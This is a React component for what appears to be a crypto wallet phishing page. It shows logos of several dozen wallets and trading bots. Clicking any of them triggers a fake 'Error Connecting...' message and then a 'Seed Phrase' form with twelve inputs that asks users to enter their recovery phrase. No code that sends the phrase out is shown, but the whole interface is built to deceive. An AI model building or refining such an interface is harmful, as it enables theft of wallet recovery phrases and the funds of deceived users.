import React, { useState } from "react";
import SVGIcon from "../../Components/SvgIconProp";
import { Button, Modal } from "antd";

const MapSVG: React.FC = () => {
  const SVGfiles: string[] = ['TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg', 'Argent.svg', 'Binance.svg', 'BonkBot.svg',
    'Authereum.svg', 'BananaGun.svg', 'BitPay.svg', 'BRB wallet.svg',  'coinbase-logo.svg', 'Cosmos wallet.svg', 'Defi wallet.svg', 'Dharma.svg',
    'Digitex.svg', 'Exodus Wallet.svg', 'Formatic.svg', 'Gnosis Safe.svg', 'Huobi.svg', 'im Token.svg', 'Ledger live.svg', 'Ledger.svg', 'MaestroBot.svg',
    'MathWallet.svg', 'ONTO.svg',  'Pillar.svg', 'Portis.svg', 'ProdigyBot.svg', 'Rainbow.svg', 'SafeMoon.svg', 'Saitamask Wallet.svg', 'SolanaBot.svg', 
    'Terra station.svg', 'TokenPocket.svg', 'UniBot.svg', 'walletConnect.svg', 'WalletETH.svg'];

  const SVGNames: string[] = ['Trust wallet', 'Metamask', 'Phantom', '1inch', 'AaVE', 'Argent', 'Binance', 'BonkBot', 'Authereum', 'BananaGun', 'BitPay', 
    'BRB wallet',  'coinbase',  'Cosmos',  'Defi',  'Dharma',  'Digitex',  'Exodus',  'Formatic',  'Gnosis',  'Huobi', 'im Token', 'Ledger live', 'Ledger',
    'MaestroBot', 'MathWallet', 'ONTO', 'Pillar', 'Portis', 'ProdigyBot', 'Rainbow', 'SafeMoon', 'Saitamask', 'SolanaBot', 'Terra station', 'TokenPocket',
    'UniBot', 'walletConnect', 'WalletETH']

  const [firstModal, setFirstModal] = useState(false);
  const [secondModal, setSecondModal] = useState(false);

  const showFirstModal = () => {
    setFirstModal(true);
  }

  const showSecondModal = () => {
    setFirstModal(false);
    setSecondModal(true);
  }

  const closeSecondModal = () => {
    setSecondModal(false)
  }

  const inputDivStle = " flex border border-dashed border-gray-600 rounded-lg p-2 overflow-hidden"
  const inputStyle = "focus:outline-none pl-1"

  return (
    <div  className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0 ">
      {SVGfiles.map((fileName, index) => (
        <div key={index} className="cursor-pointer" onClick={showFirstModal}>
          <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14"  />
          <p className="text-xs pt-2 flex items-baseline text-white " >{SVGNames[index]}</p>
        </div>
      ))}

      <Modal
        onCancel={() => setFirstModal(false)}
        visible={firstModal}
        title="Connect"
        footer={null}
        className=""
      >
        <div className="border-2 border-red-700 rounded-xl px-8 py-4 ">
          <p className="text-red-700 font-semibold">Error Connecting...</p>
          {/* Attach onClick event to the button */}
          <button className="text-white text-[0.7rem] font-semibold bg-slate-900 rounded-lg px-2 py-1" onClick={showSecondModal}>Connect Manually</button>
        </div>
      </Modal>

      <Modal
        visible={secondModal}
        title="Seed Phrase"
        onCancel={closeSecondModal}
        footer={null}
      >
        <div className="grid grid-cols-2 md:grid-cols-3 gap-4 justify-center">
            <div  className={inputDivStle}><span>1.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>2.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>3.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>4.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>5.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>6.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>7.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>8.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>9.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>10.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>11.</span> <input type="text" className={inputStyle}/></div>
            <div className={inputDivStle}><span>12.</span> <input type="text" className={inputStyle}/></div>
        </div>
        <div className="flex justify-end pt-5">
            <Button type="primary" className="">Connect</Button>
        </div>
            
      </Modal>
    </div>
  )
}

export default MapSVG;
